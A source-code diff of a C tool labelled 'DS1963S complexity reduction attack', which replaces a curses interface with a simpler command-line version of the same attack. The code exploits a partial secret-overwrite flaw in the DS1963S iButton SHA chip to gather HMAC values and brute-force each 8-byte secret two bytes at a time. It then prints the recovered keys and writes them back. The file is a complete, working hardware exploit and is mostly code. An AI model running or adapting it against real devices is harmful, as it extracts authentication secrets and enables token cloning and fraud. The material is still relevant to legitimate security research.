@@ -5,7 +5,7 @@
  *
  * Dedicated to Yuzuyu Arielle Huizer.
  *
- * -- Ronald Huizer, 2013
+ * -- Ronald Huizer, 2013-2016
  */
 #define _GNU_SOURCE
 #include <assert.h>
@@ -13,11 +13,10 @@
 #include <string.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <fcntl.h>
 #include <unistd.h>
-#include <ncurses.h>
-#include <pthread.h>
+#include <errno.h>
 #include <sys/ioctl.h>
-#include <sys/time.h>
 #include "ds1963s-client.h"
 #include "ds1963s-device.h"
 #include "ibutton/ownet.h"
@@ -25,68 +24,24 @@
 
 #define SERIAL_PORT		"/dev/ttyUSB0"
 #define UI_BANNER_HEAD		"DS1963S complexity reduction attack"
-#define UI_BANNER_TAIL		"Ronald Huizer (C) 2013"
-#define UI_COLUMNS_MIN		80
-#define UI_ROWS_MIN		24
+#define UI_BANNER_TAIL		"Ronald Huizer (C) 2013-2016"
 
 extern int fd[MAX_PORTNUM];
 
 struct brutus_secret
 {
-	uint8_t		target_hmac[20];
+	int		state;
+	uint8_t		target_hmac[4][20];
 	uint8_t		secret[8];
-	uint8_t		secret_idx;
 };
 
 struct brutus
 {
+	int			log_fd;
 	struct ds1963s_client	ctx;
 	struct ds1963s_device	dev[8];
 	struct brutus_secret	secrets[8];
-	pthread_t		threads[8];
 };
-
-struct brutus_interface
-{
-	WINDOW		*header;
-	WINDOW		*footer;
-	WINDOW		*serial;
-	WINDOW		*main;
-	WINDOW		*secrets;
-	int		main_rows;
-	int		main_columns;
-	pthread_mutex_t	mutex;
-	struct timeval	start;
-};
-
-/* The main brutus curses interface. */
-struct brutus_interface ui;
-
-/* Prototypes. */
-int brutus_ui_update_footer(void);
-
-int brutus_init_secret(struct brutus *brute, int secret)
-{
-        struct ds1963s_read_auth_page_reply reply;
-	int portnum = brute->ctx.copr.portnum;
-	int addr;
-
-	assert(secret >= 0 && secret <= 8);
-
-	/* Calculate the address of this secret. */
-	addr = ds1963s_client_page_to_address(secret);
-
-	/* Erase the scratchpad. */
-	EraseScratchpadSHA18(portnum, 0, 0);
-
-	/* Read auth. page over the current scratchpad/data/etc. */
-	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1)
-		return -1;
-
-	memcpy(brute->secrets[secret].target_hmac, reply.signature, 20);
-
-	return 0;
-}
 
 int brutus_init_device(struct brutus *brute)
 {
@@ -148,10 +103,48 @@ int brutus_init_devices(struct brutus *brute)
 	return 0;
 }
 
-int brutus_init(struct brutus *brute)
+void brutus_transaction_log_init(struct brutus *brute)
 {
+	char filename[128];
+	int fd;
+
+	snprintf(filename,
+	         sizeof filename,
+	         ".brutus-%.2x%.2x%.2x%.2x%.2x%.2x",
+	         brute->dev[0].serial[5], brute->dev[0].serial[4],
+	         brute->dev[0].serial[3], brute->dev[0].serial[2],
+	         brute->dev[0].serial[1], brute->dev[0].serial[0]
+	);
+
+	if ( (fd = open(filename, O_RDWR | O_CREAT | O_EXCL, 0600)) == -1) {
+		if (errno == EEXIST) {
+//			brutus_transaction_log_open(filename);
+//			return;
+		}
+
+		fprintf(stderr, "Error opening transaction log '%s'.\n", filename);
+		exit(EXIT_FAILURE);
+	}
+
+	brute->log_fd = fd;
+}
+
+void brutus_transaction_log_append(struct brutus *brute, const uint8_t *hmac, int link)
+{
+	char hmac_buf[42];
 	int i;
 
+	for (i = 0; i < 20; i++)
+		sprintf(&hmac_buf[i * 2], "%.2x", hmac[i]);
+
+	strcat(hmac_buf, link == 3 ? "\n" : ",");
+
+	write(brute->log_fd, hmac_buf, sizeof hmac_buf);
+	fsync(brute->log_fd);
+}
+
+int brutus_init(struct brutus *brute)
+{
 	/* Initialize the secrets we'll side-channel. */
 	memset(brute->secrets, 0, sizeof brute->secrets);
 
@@ -165,13 +158,8 @@ int brutus_init(struct brutus *brute)
 		return -1;
 	}
 
-	/* Calculate the target HMACs for all the secrets. */
-	for (i = 0; i < 8; i++) {
-		if (brutus_init_secret(brute, i) == -1) {
-			ds1963s_client_destroy(&brute->ctx);
-			return -1;
-		}
-	}
+	/* Initialize the transaction log. */
+	brutus_transaction_log_init(brute);
 
 	return 0;
 }
@@ -220,7 +208,7 @@ void ibutton_hide_set(SHACopr *copr)
 	}
 }
 
-void ds1963s_secret_write_partial(struct ds1963s_client *ctx, int secret, uint8_t *data, size_t len)
+void ds1963s_secret_write_partial(struct ds1963s_client *ctx, int secret, void *data, size_t len)
 {
 	SHACopr *copr = &ctx->copr;
 	uint8_t buf[32];
@@ -279,227 +267,7 @@ void ds1963s_secret_write_partial(struct ds1963s_client *ctx, int secret, uint8_
 	}
 }
 
-int brutus_do_one(struct brutus *brute, int num)
-{
-	struct brutus_secret *secret = &brute->secrets[num];
-	int addr = ds1963s_client_page_to_address(num);
-        struct ds1963s_read_auth_page_reply reply;
-	SHACopr *copr = &brute->ctx.copr;
-
-	ds1963s_secret_write_partial(
-		&brute->ctx,		/* DS1963S context */
-		num,			/* Secret number */
-		secret->secret,		/* Partial secret to write */
-		secret->secret_idx + 1	/* Length of the partial secret */
-	);
-
-	/* Erase the scratchpad. */
-        EraseScratchpadSHA18(copr->portnum, 0, 0);
-
-	/* Read auth. page over the current scratchpad/data/etc. */
-	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1) {
-		ibutton_perror("ds1963s_client_read_auth()");
-		exit(EXIT_FAILURE);
-	}
-
-	/* Compare the current hmac with the target one. */
-	if (!memcmp(secret->target_hmac, reply.signature, 20)) {
-		/* We're done if we got 4 bytes. */
-		if (secret->secret_idx++ == 3)
-			return 0;
-	} else {
-		/* Something went wrong. */
-		if (secret->secret[secret->secret_idx]++ == 255)
-			return -1;
-	}
-
-	/* More to come. */
-	return 1;
-}
-
-/* Update the progress bar for the hardware attack. */
-int update_phase1_progress(WINDOW *w, struct brutus_secret *secret, int num)
-{
-	int piece_count, piece_size = (256 * 4) / 16;
-	char *bar = "                ";
-
-	if (pthread_mutex_lock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
-
-	/* Print the attempted key bytes. */
-	wattron(w, COLOR_PAIR(3));
-	mvwprintw(w, num * 2 + 1, secret->secret_idx * 2 + 12,
-	          "%.2x", secret->secret[secret->secret_idx]);
-
-	/* Print the progress bar.  It's 16 bytes wide, and we have
-	 * to update it for 256 * 4 attempts in the worst case.
-	 */
-	piece_count = secret->secret_idx * 256 +
-	              secret->secret[secret->secret_idx];
-
-	wattron(w, A_REVERSE | COLOR_PAIR(4));
-	mvwprintw(w, num * 2 + 2, 12, "%s",
-	          &bar[16 - piece_count / piece_size]);
-	wattroff(w, A_REVERSE);
-	wrefresh(w);
-
-	if (pthread_mutex_unlock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
-
-	return 0;
-}
-
-int finalize_phase1_progress(WINDOW *w, struct brutus_secret *secret, int num)
-{
-	char *bar = "                ";
-
-	if (pthread_mutex_lock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
-
-	wattron(w, A_REVERSE | COLOR_PAIR(4));
-	mvwprintw(w, num * 2 + 2, 12, "%s", bar);
-	wattroff(w, A_REVERSE);
-	wrefresh(w);
-
-	if (pthread_mutex_unlock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
-
-	return 0;
-}
-
-
-/* Update the progress bar for the software calculation. */
-int update_phase2_progress(WINDOW *w, int num, uint64_t count)
-{
-	char *bar = "                ";
-	int piece_size;
-
-	if (pthread_mutex_lock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
-
-	piece_size = 0xFFFFFFFF / 16;
-	wattron(w, A_REVERSE | COLOR_PAIR(5));
-	mvwprintw(w, num * 2 + 2, 12, "%s", &bar[16 - count / piece_size]);
-	wattroff(w, A_REVERSE);
-	wrefresh(w);
-
-	if (pthread_mutex_unlock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
-
-	return 0;
-}
-
-int finalize_phase2_progress(WINDOW *w, struct brutus_secret *secret, int num)
-{
-	char *bar = "                ";
-
-	if (pthread_mutex_lock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
-
-	/* Update the progress bar for the software calculation. */
-	wattron(w, A_REVERSE | COLOR_PAIR(5));
-	mvwprintw(w, num * 2 + 2, 12, "%s", bar);
-	wattroff(w, A_REVERSE);
-
-	/* Update the secret as well. */
-	wattron(w, COLOR_PAIR(3));
-	mvwprintw(w, num * 2 + 1, 20, "%.2x%.2x%.2x%.2x",
-		secret->secret[4], secret->secret[5],
-		secret->secret[6], secret->secret[7]);
-	wrefresh(w);
-
-	if (pthread_mutex_unlock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
-
-	return 0;
-}
-
-struct phase2_cookie
-{
-	struct brutus	*brute;
-	int		num;
-};
-
-void *brutus_phase2_thread(void *phase2_cookie)
-{
-	struct phase2_cookie *ctx = (struct phase2_cookie *)phase2_cookie;
-	struct brutus_secret *secret = &ctx->brute->secrets[ctx->num];
-	struct ds1963s_device *dev = &ctx->brute->dev[ctx->num];
-	WINDOW *w = ui.secrets;
-	int num = ctx->num;
-	uint64_t i;
-
-	/* Calculate the remaining 4 bytes in software. */
-	memcpy(&dev->secret_memory[num * 8], secret->secret, 4);
-	for (i = 0; i < 0xFFFFFFFF; i++) {
-		dev->secret_memory[num * 8 + 4] = (i >>  0) & 0xFF;
-		dev->secret_memory[num * 8 + 5] = (i >>  8) & 0xFF;
-		dev->secret_memory[num * 8 + 6] = (i >> 16) & 0xFF;
-		dev->secret_memory[num * 8 + 7] = (i >> 24) & 0xFF;
-
-		ds1963s_dev_read_auth_page(dev, num);
-
-		if (i % (0xFFFFFFFF / 16) == 0)
-			update_phase2_progress(w, num, i);
-
-		if (!memcmp(secret->target_hmac, &dev->scratchpad[8], 20)) {
-			secret->secret[4] = (i >>  0) & 0xFF;
-			secret->secret[5] = (i >>  8) & 0xFF;
-			secret->secret[6] = (i >> 16) & 0xFF;
-			secret->secret[7] = (i >> 24) & 0xFF;
-			break;
-		}
-
-		memset(dev->scratchpad, 0xFF, 32);
-	}
-
-	finalize_phase2_progress(w, secret, num);
-	free(phase2_cookie);
-
-	return NULL;
-}
-
-void brutus_do_secret(struct brutus *brute, int num)
-{
-	struct brutus_secret *secret = &brute->secrets[num];
-	struct phase2_cookie *phase2_cookie;
-	WINDOW *w = ui.secrets;
-	int ret;
-
-	/* First phase.  We attack 4 secret bytes through the partial
-	 * overwrite flaw in the DS1963S design.
-	 */
-	do {
-		update_phase1_progress(w, secret, num);
-		brutus_ui_update_footer();
-		ret = brutus_do_one(brute, num);
-	} while (ret == 1);
-
-	if (ret == -1)
-		exit(EXIT_FAILURE);
-
-	/* Finalize the phase1 progress bar. */
-	finalize_phase1_progress(w, secret, num);
-
-	/* Fire up the phase2 thread. */
-	phase2_cookie = malloc(sizeof *phase2_cookie);
-	phase2_cookie->brute = brute;
-	phase2_cookie->num = num;
-
-	pthread_create(
-		&brute->threads[num],
-		NULL,
-		brutus_phase2_thread,
-		phase2_cookie
-	);
-}
-
-void brutus_ui_destroy(void)
-{
-	if (ui.main != NULL)
-		endwin();
-}
-
+#if 0
 static void __hmac_hex(char *buf, uint8_t hmac[20])
 {
 	int i;
@@ -507,210 +275,138 @@ static void __hmac_hex(char *buf, uint8_t hmac[20])
 	for (i = 0; i < 20; i++)
 		sprintf(&buf[i * 2], "%.2x", hmac[i]);
 }
+#endif
 
-int brutus_ui_update_footer(void)
+//	for (i = sizeof(brute->dev[0].serial) - 1; i >= 0; i--)
+//		wprintw(w, "%.2x", brute->dev[0].serial[i]);
+
+int brutus_secret_hmac_target_get(struct brutus *brute, int secret, int link)
 {
-	int elapsed, h, m, s;
-	struct timeval t;
+	struct ds1963s_read_auth_page_reply reply;
+	int portnum;
+	int addr;
 
-	if (pthread_mutex_lock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
+	assert(brute != NULL);
+	assert(secret >= 0 && secret <= 8);
+	assert(link >= 0 && link <= 3);
 
-	if (gettimeofday(&t, NULL) == -1)
-		return -1;
-
-	elapsed = t.tv_sec - ui.start.tv_sec;
-	h = elapsed / 3600;
-	m = (elapsed % 3600) / 60;
-	s = (elapsed % 3600) % 60;
-
-	mvwprintw(ui.footer, 0, 15, "%.2d:%.2d:%.2d", h, m, s);
-	wrefresh(ui.footer);
-
-	if (pthread_mutex_unlock(&ui.mutex) != 0)
-		exit(EXIT_FAILURE);
-
-	return 0;
-}
-
-int brutus_ui_secrets_init(struct brutus *brute)
-{
-	char hmac[41];
-	int i, width;
-	WINDOW *w;
-
-	width = ui.main_columns - 4;
-	if ( (w = ui.secrets = subwin(ui.main, 18, width, 4, 2)) == NULL)
-		return -1;
-
-	if (box(w, ACS_VLINE, ACS_HLINE) == ERR)
-		return -1;
-
-	for (i = 0; i < 8; i++) {
-		mvwprintw(w, i * 2 + 1, 1, "Secret #%d", i);
-		mvwprintw(w, i * 2 + 1, 11, "[                ]");
-		mvwprintw(w, i * 2 + 2, 11, "[                ]");
-
-		if (wmove(w, i * 2 + 1, 31) == ERR)
-			return -1;
-
-		__hmac_hex(hmac, brute->secrets[i].target_hmac);
-		waddstr(w, hmac);
+	/* Only link 0 is not destructive.  The other 3 links need a partial
+	 * overwrite to make things work.
+	 */
+	if (link != 0) {
+		ds1963s_secret_write_partial(
+			&brute->ctx,		/* DS1963S context         */
+			secret,			/* Secret number           */
+			"\0\0\0\0\0\0\0\0",	/* Partial secret to write */
+			link * 2		/* Length of the secret    */
+		);
 	}
 
-	wrefresh(w);
+	portnum = brute->ctx.copr.portnum;
+
+	/* Calculate the address of this secret. */
+	addr = ds1963s_client_page_to_address(secret);
+
+	/* Erase the scratchpad. */
+	if (EraseScratchpadSHA18(portnum, 0, 0) == FALSE)
+		return -1;
+
+	/* Read auth. page over the current scratchpad/data/etc. */
+	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1)
+		return -1;
+
+	memcpy(brute->secrets[secret].target_hmac[link], reply.signature, 20);
+	brutus_transaction_log_append(brute, reply.signature, link);
 
 	return 0;
 }
 
-int brutus_ui_serial_init(struct brutus *brute)
+void *brutus_brute_link(struct brutus *brute, int secret, int link)
 {
-	int width = ui.main_columns - 4;
-	WINDOW *w;
+	struct brutus_secret *secret_state = &brute->secrets[secret];
+	struct ds1963s_device *dev = &brute->dev[secret];
 	int i;
 
-	if ( (w = ui.serial = subwin(ui.main, 3, width, 1, 2)) == NULL)
-		return -1;
+	assert(brute != NULL);
+	assert(secret >= 0 && secret <= 8);
+	assert(link >= 0 && link <= 3);
 
-	if (box(w, ACS_VLINE, ACS_HLINE) == ERR)
-		return -1;
+	/* Set the secret to 0. */
+	memset(&dev->secret_memory[secret * 8], 0, 8);
 
-	if (wmove(w, 1, 1) == ERR)
-		return -1;
+	/* Copy the known part of the secret out for this link type. */
+	memcpy(&dev->secret_memory[secret * 8 + link * 2],
+	       &secret_state->secret[link * 2],
+	       8 - link * 2);
 
-	waddstr(w, "DS1963S found with serial number: ");
-	for (i = sizeof(brute->dev[0].serial) - 1; i >= 0; i--)
-		wprintw(w, "%.2x", brute->dev[0].serial[i]);
+	for (i = 0; i < 65536; i++) {
+		int index = secret * 8 + link * 2;
 
-	wrefresh(w);
+		dev->secret_memory[index]     = (i >> 0) & 0xFF;
+		dev->secret_memory[index + 1] = (i >> 8) & 0xFF;
 
-	return 0;
-}
+		ds1963s_dev_read_auth_page(dev, secret);
 
-int brutus_ui_init(struct brutus *brute)
-{
-	/* Register the ui teardown on exit. */
-	if (atexit(brutus_ui_destroy) != 0) {
-		fprintf(stderr, "atexit() failed.\n");
-		exit(EXIT_FAILURE);
+		if (!memcmp(secret_state->target_hmac[link], &dev->scratchpad[8], 20)) {
+			secret_state->secret[link * 2] = (i >>  0) & 0xFF;
+			secret_state->secret[link * 2 + 1] = (i >>  8) & 0xFF;
+			break;
+		}
+
+		memset(dev->scratchpad, 0xFF, 32);
 	}
 
-	/* Catch errors for older versions of curses. */
-	if ( (ui.main = initscr()) == NULL)
-		return -1;
-
-	getmaxyx(ui.main, ui.main_rows, ui.main_columns);
-
-	/* See if the terminal has the proper dimension. */
-	if (ui.main_rows < UI_ROWS_MIN || ui.main_columns < UI_COLUMNS_MIN)
-		return -1;
-
-	if ( (ui.header = subwin(ui.main, 1, ui.main_columns, 0, 0)) == NULL)
-		return -1;
-
-	if ( (ui.footer = subwin(ui.main, 1, ui.main_columns, ui.main_rows - 1, 0)) == NULL)
-		return -1;
-
-	if (cbreak() == ERR)
-		return -1;
-
-	if (curs_set(0) == ERR)
-		return -1;
-
-	if (has_colors() == FALSE)
-		printf("CRAP\n");
-
-	/* Initialize the color scheme we'll use. */
-	if (start_color() == ERR)
-		return -1;
-
-	if (init_pair(1, COLOR_YELLOW, COLOR_BLUE) == ERR)
-		return -1;
-
-	if (init_pair(2, COLOR_BLACK, COLOR_CYAN) == ERR)
-		return -1;
-
-	if (init_pair(3, COLOR_WHITE, COLOR_BLUE) == ERR)
-		return -1;
-
-	if (init_pair(4, COLOR_CYAN, COLOR_BLACK) == ERR)
-		return -1;
-
-	if (init_pair(5, COLOR_GREEN, COLOR_BLACK) == ERR)
-		return -1;
-
-	/* Set the colors for the main window. */
-	if (bkgd(COLOR_PAIR(1)) == -1)
-		return -1;
-
-	if (attron(COLOR_PAIR(3)) == -1)
-		return -1;
-
-	/* Set the colors the the header and footer windows. */
-	wbkgd(ui.header, COLOR_PAIR(2));
-	wattron(ui.header, COLOR_PAIR(2));
-	wbkgd(ui.footer, COLOR_PAIR(2));
-	wattron(ui.footer, COLOR_PAIR(2));
-
-	mvwaddstr(ui.header, 0, 1, UI_BANNER_HEAD);
-	mvwaddstr(ui.header, 0, ui.main_columns - sizeof UI_BANNER_TAIL,
-	          UI_BANNER_TAIL);
-
-	mvwaddstr(ui.footer, 0, 1, "Time elapsed: 00:00:00");
-
-	if (gettimeofday(&ui.start, NULL) == -1)
-		return -1;
-
-	/* Initialize the serial sub-window. */
-	if (brutus_ui_serial_init(brute) == -1)
-		return -1;
-
-	/* Now initialize the secrets sub-window. */
-	if (brutus_ui_secrets_init(brute) == -1)
-		return -1;
-
-	if (refresh() == -1)
-		return -1;
-
-	if (pthread_mutex_init(&ui.mutex, NULL) != 0)
-		return -1;
-
-	return 0;
+	return NULL;
 }
 
 int main(int argc, char **argv)
 {
 	struct brutus brute;
-	struct timespec t;
-	int i;
+	int i, secret, link;
 
-	/* Before we initialize the UI, make sure the button is there. */
+	printf(UI_BANNER_HEAD " -- " UI_BANNER_TAIL "\n\n");
+
 	if (brutus_init(&brute) == -1) {
 		brutus_perror("brutus_init()");
 		exit(EXIT_FAILURE);
 	}
 
-	/* Initialize the UI. */
-	if (brutus_ui_init(&brute) == -1) {
-		fprintf(stderr, "brutus_ui_init() failed.\n");
-		exit(EXIT_FAILURE);
+	printf("01. Calculating HMAC links.\n");
+
+	for (secret = 0; secret < 8; secret++) {
+		for (link = 0; link < 4; link++) {
+			printf("\r    Secret #%d [%d/4]", secret, link);
+			fflush(stdout);
+			brutus_secret_hmac_target_get(&brute, secret, link);
+		}
+		printf("\r    Secret #%d [4/4]\n", secret);
 	}
 
-	/* Work our way through the eight secrets. */
-	for (i = 0; i < 8; i++)
-		brutus_do_secret(&brute, i);
+	printf("02. Calculating secrets from HMAC links.\n");
 
-	/* Join all 8 threads, updating the clock. */
-	t.tv_nsec = 0;
-	t.tv_sec = 1;
+	for (secret = 0; secret < 8; secret++) {
+		for (link = 3; link >= 0; link--)
+			brutus_brute_link(&brute, secret, link);
 
-	for (i = 0; i < 8; i++) {
-		do {
-			brutus_ui_update_footer();
-		} while (pthread_timedjoin_np(brute.threads[i], 0, &t) != 0);
+		printf("    Secret #%d: ", secret);
+		for (i = 0; i < 8; i++)
+			printf("%.2x", brute.secrets[secret].secret[i]);
+		printf("\n");
 	}
 
-	getch();
+	printf("03. Restoring recovered keys.\n");
+
+	for (secret = 0; secret < 8; secret++) {
+		printf("    Secret #%d\n", secret);
+        	ds1963s_client_secret_write(
+			&brute.ctx,
+			secret,
+			brute.secrets[secret].secret,
+			8
+		);
+        }
+
+
 	brutus_destroy(&brute);
 	exit(EXIT_SUCCESS);
 }
